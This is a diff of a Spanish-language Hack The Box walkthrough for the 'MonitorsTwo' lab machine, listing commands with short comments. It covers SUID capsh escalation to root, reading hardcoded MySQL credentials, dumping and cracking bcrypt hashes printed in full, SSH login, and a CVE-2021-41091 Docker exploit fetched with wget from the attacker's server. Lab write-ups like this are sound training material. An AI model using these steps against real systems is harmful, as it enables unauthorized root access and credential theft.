@@ -14,8 +14,53 @@ HACK THE BOX - MONITORSTWO MACHINE
 - whoami                                                                                                                     -Verificamos que usuario somos
 - id                                                                                                                         -Verificamos a que grupos pertenecemos 
 - sudo -l                                                                                                                    -Verificamos que permisos tenemos como usuario www-data, pero el sistema no reconoce el comando sudo
-- find / -perm -u=s 2>/dev/null                                                                                              -El comando nos permite hacer una busqueda en todos los directorio, de archivos o directorios que tengan permisos "SUID", que ejecuta con permisos de propietario y no del usuario. a lo que encontramos posibles comandos de explotación como lo es "/sbin/capsh", y buscando en https://gtfobins.github.io, verificamos que hay posibilidad de explotación para escalada de privilegios.
+- find / -perm -u=s 2>/dev/null                                                                                              -El comando nos permite hacer una busqueda en todos los directorio, de archivos o directorios que tengan permisos "SUID", que ejecuta con permisos de propietario y no del usuario, a lo que encontramos posibles comandos de explotación como lo es "/sbin/capsh", y buscando en https://gtfobins.github.io, verificamos que hay posibilidad de explotación para escalada de privilegios.
 - cd /sbin                                                                                                                   -Nos dirigimos al directorio y ejecutamos el comando para la escalada de privilegios
 - ./capsh --gid=0 --uid=0 --                                                                                                 -Con el comando escalamos los privilegios a root y termiamos con permisos de superusuario.
 - whoami                                                                                                                     -Somos el usuario root
+
             - Hacemos un research dentro de los archivos 
+
+    (Como usuario ROOT)
+
+- ls                                                                                                                         -Verificamos que archivos tenemos dentro del directorio, y encontramos el archivo entrypoint.sh, el cual verificamos y encontramos que se tiene una conexion a una base de datos y esta interactua con una tabla user_auth
+- cat entrypoint.sh                                                                                                          -En el archivo encontramos que se ejecuta codigo de conexión respecto a una base de datos mysql y encontramos el comando (mysql --host=db --user=root --password=root cacti -e "show tables")
+- mysql --host=db --user=root --password=root cacti -e "show tables"                                                         -Ejecutamos el comando sql y nos muestra las tablas dentro de la base de datos, dentro de los cuales encontramos 
+- mysql --host=db --user=root --password=root cacti -e "SELECT * FROM auth_user"                                             -Listamos el contenido de la tabla "user_auth" y encontramos 2 credenciales las cuales intentamos crackear "admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC" y "marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C"
+- vi hashes                                                                                                                  -Guardamos ambos hashes en un archivo y procedemos a decifrarlo con "john"
+- john -w=/usr/share/wordlists/rockyou.txt hashes                                                                            -Podemos cracker la pass del usuario marcus, a lo que intentamos conectarnos mediante ssh
+
+    (Desde nuestro terminal kali)
+- sudo shh marcus@10.10.11.211                                                                                               -Nos conectamos y usamos las credenciales anteriormente crackeadas
+
+            - Conectados a marcus podemos observar que el usuario recibio un mail por parte del administrador
+
+- cat  /var/spool/mail/marcus                                                                                                 -Dentro del mail encontramos que se notifican varias vulnerabilidades, dentro de las cuales encontramos: "CVE-2021-41091" la cual se encuentra relacionada a dockers, y en funcion a eso verificamos en el sistema
+- findmnt                                                                                                                     -Utilidad en Linux que se utiliza para mostrar información detallada sobre los puntos de montaje del sistema de archivos
+
+            - Encontramos algunos Dockers en el directorio: /var/lib/docker/overlay2/ y accedemos a uno de ellos, ademas buscamos en google sobre el CVE y encontramos el siguiente exploit, el cual usaremos para escalar privilegios https://github.com/UncleJ4ck/CVE-2021-41091
+
+- cd /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged                         -Para escalar los privilegios acorde al exploit visto anteriormente, necesitamos primeramente establecer /bin/bash con permisos de SUID para lo que dentro usuario root, usamos el siguiente comando:
+
+    (En la shell root)
+- chmod u+s /bin/bash
+
+    (En la shell marcus)
+- cd /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp                     -Nos colocamos en el directorio tmp y descargamos el exploit desde nuestro servidor
+
+    (Our PC)
+- cd /opt/DockerPrivScal/CVE-2021-41091                                                                                       -Dentro de la carpeta en la que tenemos el exploit, ejectuamos http.server
+- sudo python3 https.server 80
+
+    (En la shell marcus)
+- wget http://10.10.14.43:80/exp.sh                                                                                            -Dentro de .../tmp/ decargamos el exploit
+- chmod +x exp.sh                                                                                                              -Le concedemos permisos de ejecución
+- ./exp.sh                                                                                                                     -Ejecutamos el exploit y se realiza la escalada de privilegios
+- cd .. 
+- ./bin/bash                                                                                                                   -Tenemos permisos de root                                                                                       
+- cd root
+- cat root.txt
+- cat /usr/home/marcus/user.txt
+
+
+        - MAQUINA TERMINADA
